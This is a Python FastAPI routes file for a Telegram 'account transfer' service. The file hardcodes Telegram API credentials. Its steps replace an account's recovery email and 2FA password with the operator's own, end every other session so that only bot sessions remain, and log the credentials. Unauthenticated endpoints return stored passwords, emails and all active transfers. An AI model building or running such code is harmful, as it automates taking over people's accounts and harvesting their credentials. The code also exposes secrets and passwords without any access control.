"""
Transfer API Routes
Handles account transfer operations in two modes
"""

import time
from typing import Optional
from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from backend.core_engine.logger import get_logger, log_request
from backend.core_engine.pyrogram_client import get_session_manager
from backend.services.transfer_service import get_transfer_service, TransferStep
from backend.services.security_audit import SecurityAuditService, TransferMode
from backend.core_engine.credentials_logger import log_credentials

logger = get_logger("TransferAPI")

router = APIRouter(prefix="/transfer", tags=["Transfer"])

# API credentials
API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


class InitiateTransferRequest(BaseModel):
    phone: str
    mode: str = "bot_only"  # "bot_only" or "user_keeps_session"
    current_password: Optional[str] = None


class EmailChangeRequest(BaseModel):
    phone: str
    current_password: str


class EmailConfirmRequest(BaseModel):
    phone: str
    code: str


class PasswordChangeRequest(BaseModel):
    phone: str


def get_pyrogram():
    """Get or create Pyrogram session manager"""
    return get_session_manager(API_ID, API_HASH)


@router.post("/initiate")
async def initiate_transfer(request: InitiateTransferRequest):
    """
    Initiate account transfer process
    
    Modes:
    - bot_only: User exits, only bot sessions remain
    - user_keeps_session: User keeps one session, we change email + password
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/initiate", {"phone": request.phone, "mode": request.mode})
    
    try:
        pyrogram = get_pyrogram()
        transfer_service = get_transfer_service()
        
        # Get user info (telegram_id)
        user_info = await pyrogram.get_me_info(request.phone)
        if user_info.get("status") == "error":
            raise HTTPException(status_code=400, detail=f"Failed to get user info: {user_info.get('error')}")
        
        telegram_id = user_info.get("id")
        
        # Determine mode
        mode = TransferMode.MODE_BOT_ONLY if request.mode == "bot_only" else TransferMode.MODE_USER_KEEPS_SESSION
        
        # Initiate transfer
        transfer_state = await transfer_service.initiate_transfer(
            phone=request.phone,
            telegram_id=telegram_id,
            mode=mode,
            current_2fa_password=request.current_password
        )
        
        # Run audit
        security_info = await pyrogram.get_security_info(request.phone)
        if security_info.get("status") == "error":
            raise HTTPException(status_code=400, detail=security_info.get("error"))
        
        passed, issues, actions_needed = SecurityAuditService.run_audit(
            security_info=security_info,
            phone=request.phone,
            mode=mode,
            telegram_id=telegram_id
        )
        
        duration = time.time() - start_time
        
        return {
            "status": "success",
            "transfer_state": transfer_state,
            "audit": SecurityAuditService.format_audit_report(passed, issues, actions_needed),
            "next_step": "change_email",
            "our_email": transfer_state["our_email"],
            "email_hash": transfer_state["email_hash"],
            "duration": duration
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error initiating transfer: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/change-email")
async def change_email(request: EmailChangeRequest):
    """
    Step 2: Change recovery email to our email
    This will trigger Telegram to send a verification code to our email
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/change-email", {"phone": request.phone})
    
    try:
        pyrogram = get_pyrogram()
        transfer_service = get_transfer_service()
        
        result = await transfer_service.execute_email_change(
            pyrogram_manager=pyrogram,
            phone=request.phone,
            current_password=request.current_password
        )
        
        if result.get("status") == "error":
            raise HTTPException(status_code=400, detail=result.get("error"))
        
        duration = time.time() - start_time
        result["duration"] = duration
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error changing email: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/confirm-email")
async def confirm_email(request: EmailConfirmRequest):
    """
    Step 3: Confirm email with verification code
    Code can be received via webhook or entered manually
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/confirm-email", {"phone": request.phone})
    
    try:
        pyrogram = get_pyrogram()
        transfer_service = get_transfer_service()
        
        result = await transfer_service.confirm_email_with_code(
            pyrogram_manager=pyrogram,
            phone=request.phone,
            code=request.code
        )
        
        if result.get("status") == "error":
            raise HTTPException(status_code=400, detail=result.get("error"))
        
        duration = time.time() - start_time
        result["duration"] = duration
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error confirming email: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/change-password")
async def change_password(request: PasswordChangeRequest):
    """
    Step 4: Change 2FA password to our generated password
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/change-password", {"phone": request.phone})
    
    try:
        pyrogram = get_pyrogram()
        transfer_service = get_transfer_service()
        
        result = await transfer_service.execute_password_change(
            pyrogram_manager=pyrogram,
            phone=request.phone
        )
        
        if result.get("status") == "error":
            raise HTTPException(status_code=400, detail=result.get("error"))
        
        duration = time.time() - start_time
        result["duration"] = duration
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error changing password: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/terminate-sessions")
async def terminate_sessions(phone: str):
    """
    Step 5 (bot_only mode): Terminate all other sessions
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/terminate-sessions", {"phone": phone})
    
    try:
        pyrogram = get_pyrogram()
        transfer_service = get_transfer_service()
        
        result = await transfer_service.execute_session_termination(
            pyrogram_manager=pyrogram,
            phone=phone
        )
        
        if result.get("status") == "error":
            raise HTTPException(status_code=400, detail=result.get("error"))
        
        duration = time.time() - start_time
        result["duration"] = duration
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error terminating sessions: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/complete")
async def complete_transfer(phone: str):
    """
    Final step: Mark transfer as completed
    """
    start_time = time.time()
    log_request(logger, "POST", "/transfer/complete", {"phone": phone})
    
    try:
        transfer_service = get_transfer_service()
        
        result = await transfer_service.complete_transfer(phone)
        
        if result.get("status") == "error":
            raise HTTPException(status_code=400, detail=result.get("error"))
        
        duration = time.time() - start_time
        result["duration"] = duration
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error completing transfer: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/state/{phone}")
async def get_transfer_state(phone: str):
    """Get current transfer state for a phone number"""
    transfer_service = get_transfer_service()
    state = transfer_service.get_transfer_state(phone)
    
    if not state:
        raise HTTPException(status_code=404, detail="No active transfer for this phone")
    
    return {"status": "success", "transfer": state}


@router.get("/all")
async def get_all_transfers():
    """Get all active transfers"""
    transfer_service = get_transfer_service()
    transfers = transfer_service.get_all_transfers()
    
    return {
        "status": "success",
        "count": len(transfers),
        "transfers": transfers
    }


@router.get("/credentials/{phone}")
async def get_credentials(phone: str):
    """Get credentials (password, email) for a phone number"""
    from backend.core_engine.credentials_logger import get_credentials_by_phone
    
    credentials = get_credentials_by_phone(phone)
    
    if not credentials:
        raise HTTPException(status_code=404, detail="No credentials found for this phone")
    
    # Get latest password and email
    latest_password = None
    latest_email = None
    
    for cred in reversed(credentials):
        if not latest_password and cred.get("password"):
            latest_password = cred["password"]
        if not latest_email and cred.get("email"):
            latest_email = cred["email"]
        if latest_password and latest_email:
            break
    
    return {
        "status": "success",
        "phone": phone,
        "latest_password": latest_password,
        "latest_email": latest_email,
        "history": credentials
    }


@router.get("/password-info/{phone}")
async def get_password_info(phone: str):
    """Get detailed 2FA/password info for debugging"""
    pyrogram = get_pyrogram()
    
    result = await pyrogram.get_full_password_info(phone)
    
    if result.get("status") == "error":
        raise HTTPException(status_code=400, detail=result.get("error"))
    
    return result
